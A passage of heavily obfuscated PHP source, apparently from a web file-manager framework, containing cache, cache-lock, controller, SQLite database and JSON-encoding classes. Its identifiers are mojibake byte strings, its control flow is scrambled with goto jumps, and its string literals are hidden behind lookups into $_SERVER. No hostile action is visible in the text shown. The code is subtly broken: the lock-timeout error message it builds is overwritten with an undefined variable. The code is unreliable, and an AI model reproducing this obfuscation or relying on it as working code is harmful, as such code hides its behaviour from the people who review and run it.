unset(self::$memoryCache[$C•ëÉ£×Ñ…]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¢à][758])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¢à][759])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($aˆŸ–êÖ†Ÿ, $FîóĞëæò£) { $aÛ†Ç¦ºŒ =& $_SERVER[¢à]; $this->cachePath = $aˆŸ–êÖ†Ÿ[$aÛ†Ç¦ºŒ[75]]; $this->prefix = $aÛ†Ç¦ºŒ[760]; $this->cacheTime = $FîóĞëæò£; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($eŒàÁª¸ªË) { $FÜõÜÙåª =& $_SERVER[¢à]; $eŒàÁª¸ªË = str_replace(array($FÜõÜÙåª[761], $FÜõÜÙåª[95], $FÜõÜÙåª[69]), $FÜõÜÙåª[762], $eŒàÁª¸ªË); return $this->cachePath . $FÜõÜÙåª[763] . $eŒàÁª¸ªË . $FÜõÜÙåª[764]; } public function set($cßù¼ÚóÀÙ, $B„¡”îÙ…İ, $CÆ»ç‚¼ù‹ = false) { $d¢ãğé¤µ = $this->getFile($cßù¼ÚóÀÙ); if (file_put_contents($d¢ãğé¤µ, $this->prefix . $B„¡”îÙ…İ, LOCK_EX)) { return !0; } @unlink($d¢ãğé¤µ); return !1; } public function get($A£ÍºŠÌ¦) { $C¿µ¶Õ³øà = $this->getFile($A£ÍºŠÌ¦); if (file_exists($C¿µ¶Õ³øà) && filemtime($C¿µ¶Õ³øà) < time() - $this->cacheTime) { @unlink($C¿µ¶Õ³øà); return !1; } $FÌÆ¸åÄæŒ = @file_get_contents($C¿µ¶Õ³øà); return substr($FÌÆ¸åÄæŒ, strlen($this->prefix)); } public function remove($cñÖ°¢áçó) { $aˆÄŠƒÉì = $this->getFile($cñÖ°¢áçó); return @unlink($aˆÄŠƒÉì); } public function deleteAll() { $f¹èì ‘‹° =& $_SERVER[¢à]; $eÏ‰ŠÄ´õ = scandir($this->cachePath); foreach ($eÏ‰ŠÄ´õ as $eÎ¡õ©¤) { $f™å£¨¼íË = $this->cachePath . $eÎ¡õ©¤; if (strpos($f™å£¨¼íË, $f¹èì ‘‹°[764]) && strpos($f™å£¨¼íË, $f¹èì ‘‹°[765])) { @unlink($f™å£¨¼íË); } } } public function clearTimeout() { $bµ‰¥“×Î¨ =& $_SERVER[¢à]; $FÇŒ™·öåÖ = scandir($this->cachePath); foreach ($FÇŒ™·öåÖ as $C‚÷„ö÷¾•) { $EÚ¯»˜­Ó‹ = $this->cachePath . $C‚÷„ö÷¾•; if (strpos($EÚ¯»˜­Ó‹, $bµ‰¥“×Î¨[764]) && strpos($EÚ¯»˜­Ó‹, $bµ‰¥“×Î¨[765]) && filemtime($EÚ¯»˜­Ó‹) < time() - $this->cacheTime) { @unlink($EÚ¯»˜­Ó‹); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto c¢ÊÒ¡ÔµÒ; dÛ‘¿Èˆøé: if ($e¾âÇ¤åñ == $dÈ÷ğø½İ‰[17] && $AŞ»–ëù… == $dÈ÷ğø½İ‰[9]) { $e¾âÇ¤åñ = $dÈ÷ğø½İ‰[164]; } switch ($e¾âÇ¤åñ) { case $dÈ÷ğø½İ‰[756]: self::$handle = new CacheLockRedis(); break; case $dÈ÷ğø½İ‰[757]: self::$handle = new CacheLockMemcached(); break; case $dÈ÷ğø½İ‰[17]: self::$handle = new CacheLockDatabase(); break; case $dÈ÷ğø½İ‰[164]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto b“ç’§×õ; DÊÀ»Ö‘ÙÚ: self::$timeout = $DŞ¬ÜÍå”Ò[$dÈ÷ğø½İ‰[766]] ? $DŞ¬ÜÍå”Ò[$dÈ÷ğø½İ‰[766]] : 10; $AŞ»–ëù… = _get($GLOBALS[$dÈ÷ğø½İ‰[6]], $dÈ÷ğø½İ‰[767]); $e¾âÇ¤åñ = $DŞ¬ÜÍå”Ò[$dÈ÷ğø½İ‰[753]] ? $DŞ¬ÜÍå”Ò[$dÈ÷ğø½İ‰[753]] : $dÈ÷ğø½İ‰[164]; goto dÛ‘¿Èˆøé; c¢ÊÒ¡ÔµÒ: $dÈ÷ğø½İ‰ =& $_SERVER[¢à]; if (self::$handle) { return self::$handle; } $DŞ¬ÜÍå”Ò = $GLOBALS[$dÈ÷ğø½İ‰[6]][$dÈ÷ğø½İ‰[334]]; goto DÊÀ»Ö‘ÙÚ; b“ç’§×õ: } private static function key($eÓÉÁµ¹‡ø) { return $_SERVER[¢à][768] . Cache::key($eÓÉÁµ¹‡ø); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($FãÓÁÂ§éÆ = '') { self::$errorMsg = $FãÓÁÂ§éÆ; } public static function lockGlobal($E‹ïßÄÍÔ, $a»Àé¸›ºÔ) { return self::lock($E‹ïßÄÍÔ, $a»Àé¸›ºÔ, !0); } public static function lock($D¨Š†ÍÎ½, $E’”•‰Ÿäñ = false, $fÉËò–ÕùÒ = false) { goto fæ¡Òô—Ğƒ; fæ¡Òô—Ğƒ: $a•Ôù³ ë÷ =& $_SERVER[¢à]; $bô£˜ƒ¯Í = self::init(); $dùÂ–¼ˆ¼ = self::key($D¨Š†ÍÎ½); goto eå›Óßç²˜; aŠ¿¨İÃ—: if (!$fÉËò–ÕùÒ) { self::$lockItem[$dùÂ–¼ˆ¼] = !0; } return $E¦¥ÒåÄ‰; goto C•ÅÂÙß¬È; eå›Óßç²˜: $E’”•‰Ÿäñ = $E’”•‰Ÿäñ ? $E’”•‰Ÿäñ : self::$timeout; $E¦¥ÒåÄ‰ = $bô£˜ƒ¯Í->lock($dùÂ–¼ˆ¼, $E’”•‰Ÿäñ); if (!$E¦¥ÒåÄ‰) { $A¦à³£¢ï = $a•Ôù³ ë÷[769] . $E’”•‰Ÿäñ . $a•Ôù³ ë÷[67] . self::$errorMsg . $a•Ôù³ ë÷[67] . get_caller_msg(); $a²Ğ½ë³ì = "\114\x6f\x63\x6b\40\141\x63\164\x69\x6f\156\x3a\40{$dùÂ–¼ˆ¼}\40\x74\x69\155\145\x6f\x75\x74\x2c\x6f\x76\145\162\x20{$E’”•‰Ÿäñ}\x20\x73"; $a²Ğ½ë³ì = self::$errorMsg ? self::$errorMsg : $Fà¢Í”ñŸ; write_log($A¦à³£¢ï, $a•Ôù³ ë÷[770]); show_json($a²Ğ½ë³ì, !1); } goto aŠ¿¨İÃ—; C•ÅÂÙß¬È: } public static function lockGet($DÚß°˜«´) { $AÓ»È˜Íñ¼ = self::key($DÚß°˜«´); if (self::$lockItem[$AÓ»È˜Íñ¼]) { return self::$lockItem[$AÓ»È˜Íñ¼]; } return self::init()->lockGet($AÓ»È˜Íñ¼); } public static function unlock($b„¥ºğöÏ‰) { $còí•ã¼ö = self::key($b„¥ºğöÏ‰); self::$lockItem[$còí•ã¼ö] = null; return self::init()->unlock($còí•ã¼ö); } public static function unlockRuntime() { $bíÅŒˆğ‹ =& $_SERVER[¢à]; $C×Ü«¤³Àö = self::init(); $BÁµê•†¡ = !1; foreach (self::$lockItem as $a¾·‰ÊÆ¯ => $dæÉé‰îùİ) { if (!$dæÉé‰îùİ) { continue; } $C×Ü«¤³Àö->unlock($a¾·‰ÊÆ¯); if (!$BÁµê•†¡) { $BÁµê•†¡ = !0; write_log($bíÅŒˆğ‹[771] . $a¾·‰ÊÆ¯ . $bíÅŒˆğ‹[67] . get_caller_msg(), $bíÅŒˆğ‹[770]); continue; } write_log($bíÅŒˆğ‹[771] . $a¾·‰ÊÆ¯, $bíÅŒˆğ‹[770]); } } } goto d“™Ğé¿Ò; cÙÉ‹¬Ï˜ß: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto E£®†µã°Ö; E£®†µã°Ö: $D˜“¨²§”Æ =& $_SERVER[¢à]; global $in, $config; $this->config =& $config; goto EÜ¾îé¶Â; EÜ¾îé¶Â: $this->in =& $in; $this->values[$D˜“¨²§”Æ[6]] =& $config; $this->values[$D˜“¨²§”Æ[7]] =& $in; goto fò”ˆ‘ì½Ö; fò”ˆ‘ì½Ö: $this->tpl = TEMPLATE . MOD . $D˜“¨²§”Æ[8]; $this->_classObjectID = mt_rand(0, 10000); goto F¦ùí¥õí; F¦ùí¥õí: } public function loadClass($b‹·›É…İ) { if (1 === func_num_args()) { $this->{$b‹·›É…İ} = new $b‹·›É…İ(); } else { $E‘âì’Ä«¨ = new ReflectionClass($b‹·›É…İ); $Bƒˆ¬‹õİ— = func_get_args(); array_shift($Bƒˆ¬‹õİ—); $this->{$b‹·›É…İ} = $E‘âì’Ä«¨->newInstanceArgs($Bƒˆ¬‹õİ—); } return $this->{$b‹·›É…İ}; } protected function assign($aÀƒ‰ÆÈ—Æ, $aâ½Ÿ˜¦) { $this->values[$aÀƒ‰ÆÈ—Æ] = $aâ½Ÿ˜¦; } protected function display($C‡ÎÅ“‰ë×) { ob_end_clean(); extract($this->values); require $this->tpl . $C‡ÎÅ“‰ë×; } } class DbSqliteBase extends Db { public function __construct($FÏÄªö„Ùó = '') { $C’ª˜à¤ =& $_SERVER[¢à]; if (!extension_loaded($C’ª˜à¤[9])) { think_exception(think_lang($C’ª˜à¤[10]) . $C’ª˜à¤[11]); } if (!empty($FÏÄªö„Ùó)) { if (!isset($FÏÄªö„Ùó[$C’ª˜à¤[12]])) { $FÏÄªö„Ùó[$C’ª˜à¤[12]] = 438; } $this->config = $FÏÄªö„Ùó; if (empty($this->config[$C’ª˜à¤[13]])) { $this->config[$C’ª˜à¤[13]] = array(); } } } public function connect($Aò÷¸…æŸ© = '', $CøÓ¿öæä = 0) { $D“–·Ê‘» =& $_SERVER[¢à]; if (!isset($this->linkID[$CøÓ¿öæä])) { goto fªë½§Ë‡¯; fªë½§Ë‡¯: if (empty($Aò÷¸…æŸ©)) { $Aò÷¸…æŸ© = $this->config; } $e‡ÒÍƒáèñ = !empty($Aò÷¸…æŸ©[$D“–·Ê‘»[13]][$D“–·Ê‘»[14]]) ? $Aò÷¸…æŸ©[$D“–·Ê‘»[13]][$D“–·Ê‘»[14]] : $this->pconnect; $f¾±ãçš”ä = $e‡ÒÍƒáèñ ? $D“–·Ê‘»[15] : $D“–·Ê‘»[16]; goto FğãŠ¬ñÊ¸; B¨ÕæÕª©Î: @sqlite_busy_timeout($this->linkID[$CøÓ¿öæä], 30000); if (1 != think_config($D“–·Ê‘»[18])) { unset($this->config); } goto Eà©É˜ë¶ä; FğãŠ¬ñÊ¸: $this->linkID[$CøÓ¿öæä] = $f¾±ãçš”ä($Aò÷¸…æŸ©[$D“–·Ê‘»[17]], $Aò÷¸…æŸ©[$D“–·Ê‘»[12]]); if (!$this->linkID[$CøÓ¿öæä]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto B¨ÕæÕª©Î; Eà©É˜ë¶ä: } return $this->linkID[$CøÓ¿öæä]; } public function free() { $this->queryID = null; } public function query($eŠµëíöÀ) { goto féÈšõËà–; féÈšõËà–: $CÔŞœßŠÓ =& $_SERVER[¢à]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto bŞÖ¬½“½ø; d—™œÔÎÏ: think_status($CÔŞœßŠÓ[20]); $this->queryID = sqlite_query($this->_linkID, $eŠµëíöÀ); $this->debug(); goto D›Ä‚‚¾²; D›Ä‚‚¾²: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Dïª•î¥‚ = $this->getAll(); return $Dïª•î¥‚; } goto a´‰¿ÅÎ’; bŞÖ¬½“½ø: $this->queryStr = $eŠµëíöÀ; if ($this->queryID) { $this->free(); } think_action_status($CÔŞœßŠÓ[19], 1); goto d—™œÔÎÏ; a´‰¿ÅÎ’: } public function execute($fÂªÖã„éª) { goto d‘ºÚÖƒ÷; AŠÓùˆËÒ: $this->queryStr = $fÂªÖã„éª; if ($this->queryID) { $this->free(); } think_action_status($B‚°íœ£ºš[21], 1); goto D‹Ö·¾–éá; D‹Ö·¾–éá: think_status($B‚°íœ£ºš[20]); $D¨¥Ëª‚’è = sqlite_exec($this->_linkID, $fÂªÖã„éª); $this->debug(); goto bÙéÔ”áÛç; d‘ºÚÖƒ÷: $B‚°íœ£ºš =& $_SERVER[¢à]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto AŠÓùˆËÒ; bÙéÔ”áÛç: if (!1 === $D¨¥Ëª‚’è) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto aâ¾Íîàåò; aâ¾Íîàåò: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¢à][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d·‡ÈÑÎ½§ = sqlite_query($this->_linkID, $_SERVER[¢à][23]); if (!$d·‡ÈÑÎ½§) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $EÌ¡°“ßÌ¹ = sqlite_query($this->_linkID, $_SERVER[¢à][24]); if (!$EÌ¡°“ßÌ¹) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $b ›‰³²ÏÂ = array(); if ($this->numRows > 0) { for ($aÏ¥§È¡ = 0; $aÏ¥§È¡ < $this->numRows; $aÏ¥§È¡++) { $b ›‰³²ÏÂ[$aÏ¥§È¡] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $b ›‰³²ÏÂ; } public function getFields($Aå´È‘ÚÄ) { $d±»ÚÀ³¯è =& $_SERVER[¢à]; $B•è³¯½‚ = $this->query($d±»ÚÀ³¯è[25] . $Aå´È‘ÚÄ . $d±»ÚÀ³¯è[26]); $E¸µö¶ï” = array(); if ($B•è³¯½‚) { foreach ($B•è³¯½‚ as $eÃĞó„ˆíï => $e“ÇÛ³Ùñ) { $E¸µö¶ï”[$e“ÇÛ³Ùñ[$d±»ÚÀ³¯è[27]]] = array($d±»ÚÀ³¯è[28] => $e“ÇÛ³Ùñ[$d±»ÚÀ³¯è[27]], $d±»ÚÀ³¯è[29] => $e“ÇÛ³Ùñ[$d±»ÚÀ³¯è[30]], $d±»ÚÀ³¯è[31] => (bool) ($e“ÇÛ³Ùñ[$d±»ÚÀ³¯è[32]] === $d±»ÚÀ³¯è[33]), $d±»ÚÀ³¯è[34] => $e“ÇÛ³Ùñ[$d±»ÚÀ³¯è[35]], $d±»ÚÀ³¯è[36] => strtolower($e“ÇÛ³Ùñ[$d±»ÚÀ³¯è[37]]) == $d±»ÚÀ³¯è[38], $d±»ÚÀ³¯è[39] => strtolower($e“ÇÛ³Ùñ[$d±»ÚÀ³¯è[40]]) == $d±»ÚÀ³¯è[41]); } } return $E¸µö¶ï”; } public function getTables($b•ßª±éÓò = '') { $f¯ìªËöØ =& $_SERVER[¢à]; $d¦ÀêÇŒñÑ = $this->query($f¯ìªËöØ[42] . $f¯ìªËöØ[43] . $f¯ìªËöØ[44]); $a”³¦ø»„â = array(); foreach ($d¦ÀêÇŒñÑ as $DÁóºä›öÅ => $C¨Á¶“—ÂÎ) { $a”³¦ø»„â[$DÁóºä›öÅ] = current($C¨Á¶“—ÂÎ); } return $a”³¦ø»„â; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $dÍ—•ÃíÎ =& $_SERVER[¢à]; $aÊÖË»©ÎÈ = sqlite_last_error($this->_linkID); $this->error = $aÊÖË»©ÎÈ . $dÍ—•ÃíÎ[4] . sqlite_error_string($aÊÖË»©ÎÈ); if ($dÍ—•ÃíÎ[33] != $this->queryStr) { $this->error .= LNG($dÍ—•ÃíÎ[45]) . $this->queryStr; } think_trace($this->error, $dÍ—•ÃíÎ[33], $dÍ—•ÃíÎ[46]); return $this->error; } public function escapeString($báÂÂîÔÀ†) { return sqlite_escape_string($báÂÂîÔÀ†); } public function parseLimit($B­¿ÖëÓØ–) { $D¬“‰²½„ø =& $_SERVER[¢à]; $EÑË‰¯ª = $D¬“‰²½„ø[33]; if (!empty($B­¿ÖëÓØ–)) { $B­¿ÖëÓØ– = explode($D¬“‰²½„ø[47], $B­¿ÖëÓØ–); if (count($B­¿ÖëÓØ–) > 1) { $EÑË‰¯ª .= $D¬“‰²½„ø[48] . $B­¿ÖëÓØ–[1] . $D¬“‰²½„ø[49] . $B­¿ÖëÓØ–[0] . $D¬“‰²½„ø[50]; } else { $EÑË‰¯ª .= $D¬“‰²½„ø[48] . $B­¿ÖëÓØ–[0] . $D¬“‰²½„ø[50]; } } return $EÑË‰¯ª; } } class DbSqlite3Base extends Db { public function __construct($B²íÎ³ŸÔ‘ = '') { $D½ğÑîÏ± =& $_SERVER[¢à]; if (!class_exists($D½ğÑîÏ±[51])) { think_exception(think_lang($D½ğÑîÏ±[10]) . $D½ğÑîÏ±[52]); } if (!empty($B²íÎ³ŸÔ‘)) { if (!isset($B²íÎ³ŸÔ‘[$D½ğÑîÏ±[12]])) { $B²íÎ³ŸÔ‘[$D½ğÑîÏ±[12]] = 438; } $this->config = $B²íÎ³ŸÔ‘; if (empty($this->config[$D½ğÑîÏ±[13]])) { $this->config[$D½ğÑîÏ±[13]] = array(); } } } public function connect($BœÜ´…±ÛÆ = '', $b­ÈóØ¯ß› = 0) { $Däõ«‰”Ø³ =& $_SERVER[¢à]; if (!isset($this->linkID[$b­ÈóØ¯ß›])) { if (empty($BœÜ´…±ÛÆ)) { $BœÜ´…±ÛÆ = $this->config; } $this->linkID[$b­ÈóØ¯ß›] = new SQLite3($BœÜ´…±ÛÆ[$Däõ«‰”Ø³[17]]); if (!$this->linkID[$b­ÈóØ¯ß›]) { think_exception($this->linkID[$b­ÈóØ¯ß›]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$b­ÈóØ¯ß›]->busyTimeout(30000); if (1 != think_config($Däõ«‰”Ø³[18])) { unset($this->config); } } return $this->linkID[$b­ÈóØ¯ß›]; } public function free() { $this->queryID = null; } public function query($fá¤Çôƒ³Ê) { goto Aµ•ŠØ³çğ; bÒìÑÌœŸ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $BÏ®©Ò¡²¥ = $this->getAll(); $this->numRows = count($BÏ®©Ò¡²¥); return $BÏ®©Ò¡²¥; } goto aÈß‚¡’Âå; D—‘ã¶Ô®: think_status($AÀ÷Ë—Ÿ‡[20]); $this->queryID = $this->_linkID->query($fá¤Çôƒ³Ê); $this->debug(); goto bÒìÑÌœŸ; DÕ§ÄÂŠ: $this->queryStr = $fá¤Çôƒ³Ê; if ($this->queryID) { $this->free(); } think_action_status($AÀ÷Ë—Ÿ‡[19], 1); goto D—‘ã¶Ô®; Aµ•ŠØ³çğ: $AÀ÷Ë—Ÿ‡ =& $_SERVER[¢à]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto DÕ§ÄÂŠ; aÈß‚¡’Âå: } public function execute($bø”ÑÚò·ä) { goto b¤²è‘ç´; AøåÙÒ´êô: if (!1 === $Bº‡ç¿·ùÁ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto d••¿’ßöƒ; B«ØÍÀÊ‡: $this->queryStr = $bø”ÑÚò·ä; if ($this->queryID) { $this->free(); } think_action_status($c™ùîŠÄÆ§[21], 1); goto FÚŞÔ±ÙîÙ; FÚŞÔ±ÙîÙ: think_status($c™ùîŠÄÆ§[20]); $Bº‡ç¿·ùÁ = $this->_linkID->exec($bø”ÑÚò·ä); $this->debug(); goto AøåÙÒ´êô; b¤²è‘ç´: $c™ùîŠÄÆ§ =& $_SERVER[¢à]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B«ØÍÀÊ‡; d••¿’ßöƒ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¢à][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $b¼¹‡çÁª = $this->_linkID->query($_SERVER[¢à][23]); if (!$b¼¹‡çÁª) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $c´‚ï“ = $this->_linkID->query($_SERVER[¢à][24]); if (!$c´‚ï“) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $C¢ËòÁù›¸ = array(); while ($FöƒÙğÒ–‡ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $C¢ËòÁù›¸[] = $FöƒÙğÒ–‡; } $this->queryID->reset(); return $C¢ËòÁù›¸; } public function getFields($cé³Ÿ‰) { $Fø§›™Ó˜‰ =& $_SERVER[¢à]; $f¸Ö³ãƒÇö = $this->query($Fø§›™Ó˜‰[25] . $cé³Ÿ‰ . $Fø§›™Ó˜‰[26]); $aùâ›°ìíæ = array(); if ($f¸Ö³ãƒÇö) { foreach ($f¸Ö³ãƒÇö as $AàÎõŞÂƒ  => $cÒ‚¢â¯÷) { $aùâ›°ìíæ[$cÒ‚¢â¯÷[$Fø§›™Ó˜‰[28]]] = array($Fø§›™Ó˜‰[28] => $cÒ‚¢â¯÷[$Fø§›™Ó˜‰[28]], $Fø§›™Ó˜‰[29] => $cÒ‚¢â¯÷[$Fø§›™Ó˜‰[29]], $Fø§›™Ó˜‰[31] => (bool) ($cÒ‚¢â¯÷[$Fø§›™Ó˜‰[31]] === $Fø§›™Ó˜‰[33]), $Fø§›™Ó˜‰[34] => $cÒ‚¢â¯÷[$Fø§›™Ó˜‰[53]], $Fø§›™Ó˜‰[36] => (bool) $cÒ‚¢â¯÷[$Fø§›™Ó˜‰[54]], $Fø§›™Ó˜‰[39] => (bool) $cÒ‚¢â¯÷[$Fø§›™Ó˜‰[54]]); } } return $aùâ›°ìíæ; } public function getTables($aàÚªµ­ = '') { $f›ñ—¿¿­õ =& $_SERVER[¢à]; $A¥¥½ªĞõ = $this->query($f›ñ—¿¿­õ[42] . $f›ñ—¿¿­õ[43] . $f›ñ—¿¿­õ[44]); $f‚ÓÅŞÆÑƒ = array(); foreach ($A¥¥½ªĞõ as $a ÛÉ©¾·˜ => $d–ó©ó²Ò) { $f‚ÓÅŞÆÑƒ[$a ÛÉ©¾·˜] = current($d–ó©ó²Ò); } return $f‚ÓÅŞÆÑƒ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $A¡†…Ï¸  =& $_SERVER[¢à]; $this->error = $this->_linkID->lastErrorMsg(); if ($A¡†…Ï¸ [33] != $this->queryStr) { $this->error .= LNG($A¡†…Ï¸ [45]) . $this->queryStr; } think_trace($this->error, $A¡†…Ï¸ [33], $A¡†…Ï¸ [46]); return $this->error; } public function escapeString($cÏØÒÀ‡”’) { $aè”é³¿‹Ö =& $_SERVER[¢à]; if ($this->_linkID) { return $this->_linkID->escapeString($cÏØÒÀ‡”’); } return str_ireplace($aè”é³¿‹Ö[55], $aè”é³¿‹Ö[56], $cÏØÒÀ‡”’); } public function parseLimit($c’ÕÌ¯õŸ¯) { $a¥Îïöñ‡ =& $_SERVER[¢à]; $d›ö…ñÏÍ = $a¥Îïöñ‡[33]; if (!empty($c’ÕÌ¯õŸ¯)) { $c’ÕÌ¯õŸ¯ = explode($a¥Îïöñ‡[47], $c’ÕÌ¯õŸ¯); if (count($c’ÕÌ¯õŸ¯) > 1) { $d›ö…ñÏÍ .= $a¥Îïöñ‡[48] . $c’ÕÌ¯õŸ¯[1] . $a¥Îïöñ‡[49] . $c’ÕÌ¯õŸ¯[0] . $a¥Îïöñ‡[50]; } else { $d›ö…ñÏÍ .= $a¥Îïöñ‡[48] . $c’ÕÌ¯õŸ¯[0] . $a¥Îïöñ‡[50]; } } return $d›ö…ñÏÍ; } } goto Fªô”ğ‘÷…; fŒËºƒ¬Ó…: define($_SERVER[¢à][1908], 16); define($_SERVER[¢à][1909], 32); class Services_JSON { function __construct($eŞê§®Ì = 0) { $this->use = $eŞê§®Ì; } function utf162utf8($ağ‹ø†»ßÊ) { $Câ¯ĞêÈˆñ =& $_SERVER[¢à]; if (function_exists($Câ¯ĞêÈˆñ[68])) { return mb_convert_encoding($ağ‹ø†»ßÊ, $Câ¯ĞêÈˆñ[1561], $Câ¯ĞêÈˆñ[1910]); } $a‚Š¢íõïÊ = ord($ağ‹ø†»ßÊ[0]) << 8 | ord($ağ‹ø†»ßÊ[1]); switch (!0) { case (127 & $a‚Š¢íõïÊ) == $a‚Š¢íõïÊ: return chr(127 & $a‚Š¢íõïÊ); case (2047 & $a‚Š¢íõïÊ) == $a‚Š¢íõïÊ: return chr(192 | $a‚Š¢íõïÊ >> 6 & 31) . chr(128 | $a‚Š¢íõïÊ & 63); case (65535 & $a‚Š¢íõïÊ) == $a‚Š¢íõïÊ: return chr(224 | $a‚Š¢íõïÊ >> 12 & 15) . chr(128 | $a‚Š¢íõïÊ >> 6 & 63) . chr(128 | $a‚Š¢íõïÊ & 63); } return $Câ¯ĞêÈˆñ[33]; } function utf82utf16($aØì¿³Å¿Œ) { $A˜Ï­ÇÌ =& $_SERVER[¢à]; if (function_exists($A˜Ï­ÇÌ[68])) { return mb_convert_encoding($aØì¿³Å¿Œ, $A˜Ï­ÇÌ[1910], $A˜Ï­ÇÌ[1561]); } switch (strlen($aØì¿³Å¿Œ)) { case 1: return $aØì¿³Å¿Œ; case 2: return chr(7 & ord($aØì¿³Å¿Œ[0]) >> 2) . chr(192 & ord($aØì¿³Å¿Œ[0]) << 6 | 63 & ord($aØì¿³Å¿Œ[1])); case 3: return chr(240 & ord($aØì¿³Å¿Œ[0]) << 4 | 15 & ord($aØì¿³Å¿Œ[1]) >> 2) . chr(192 & ord($aØì¿³Å¿Œ[1]) << 6 | 127 & ord($aØì¿³Å¿Œ[2])); } return $A˜Ï­ÇÌ[33]; } function encode($f‹è­† ¶è) { $d²ĞºÖƒÂŒ =& $_SERVER[¢à]; switch (gettype($f‹è­† ¶è)) { case $d²ĞºÖƒÂŒ[1572]: return $f‹è­† ¶è ? $d²ĞºÖƒÂŒ[1571] : $d²ĞºÖƒÂŒ[1573]; case $d²ĞºÖƒÂŒ[1911]: return $d²ĞºÖƒÂŒ[101]; case $d²ĞºÖƒÂŒ[300]: return (int) $f‹è­† ¶è; case $d²ĞºÖƒÂŒ[275]: case $d²ĞºÖƒÂŒ[274]: return (double) $f‹è­† ¶è; case $d²ĞºÖƒÂŒ[309]: $A–Ü«¿Î¤® = $d²ĞºÖƒÂŒ[33]; $aÏ µ‰¥‹£ = strlen($f‹è­† ¶è); for ($E¼ùÖÊ´¢¹ = 0; $E¼ùÖÊ´¢¹ < $aÏ µ‰¥‹£; ++$E¼ùÖÊ´¢¹) { $E¡Ÿ¡á›–ö = ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹]); switch (!0) { case $E¡Ÿ¡á›–ö == 8: $A–Ü«¿Î¤® .= $d²ĞºÖƒÂŒ[1912]; break; case $E¡Ÿ¡á›–ö == 9: $A–Ü«¿Î¤® .= $d²ĞºÖƒÂŒ[1548]; break; case $E¡Ÿ¡á›–ö == 10: $A–Ü«¿Î¤® .= $d²ĞºÖƒÂŒ[1546]; break; case $E¡Ÿ¡á›–ö == 12: $A–Ü«¿Î¤® .= $d²ĞºÖƒÂŒ[1913]; break; case $E¡Ÿ¡á›–ö == 13: $A–Ü«¿Î¤® .= $d²ĞºÖƒÂŒ[1547]; break; case $E¡Ÿ¡á›–ö == 34: case $E¡Ÿ¡á›–ö == 47: case $E¡Ÿ¡á›–ö == 92: $A–Ü«¿Î¤® .= $d²ĞºÖƒÂŒ[95] . $f‹è­† ¶è[$E¼ùÖÊ´¢¹]; break; case $E¡Ÿ¡á›–ö >= 32 && $E¡Ÿ¡á›–ö <= 127: $A–Ü«¿Î¤® .= $f‹è­† ¶è[$E¼ùÖÊ´¢¹]; break; case ($E¡Ÿ¡á›–ö & 224) == 192: $C‰“»´à¢ª = pack($d²ĞºÖƒÂŒ[1914], $E¡Ÿ¡á›–ö, ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹ + 1])); $E¼ùÖÊ´¢¹ += 1; $EªÍãÇ´… = $this->utf82utf16($C‰“»´à¢ª); $A–Ü«¿Î¤® .= sprintf($d²ĞºÖƒÂŒ[1915], bin2hex($EªÍãÇ´…)); break; case ($E¡Ÿ¡á›–ö & 240) == 224: $C‰“»´à¢ª = pack($d²ĞºÖƒÂŒ[1914], $E¡Ÿ¡á›–ö, ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹ + 1]), ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹ + 2])); $E¼ùÖÊ´¢¹ += 2; $EªÍãÇ´… = $this->utf82utf16($C‰“»´à¢ª); $A–Ü«¿Î¤® .= sprintf($d²ĞºÖƒÂŒ[1915], bin2hex($EªÍãÇ´…)); break; case ($E¡Ÿ¡á›–ö & 248) == 240: $C‰“»´à¢ª = pack($d²ĞºÖƒÂŒ[1914], $E¡Ÿ¡á›–ö, ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹ + 1]), ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹ + 2]), ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹ + 3])); $E¼ùÖÊ´¢¹ += 3; $EªÍãÇ´… = $this->utf82utf16($C‰“»´à¢ª); $A–Ü«¿Î¤® .= sprintf($d²ĞºÖƒÂŒ[1915], bin2hex($EªÍãÇ´…)); break; case 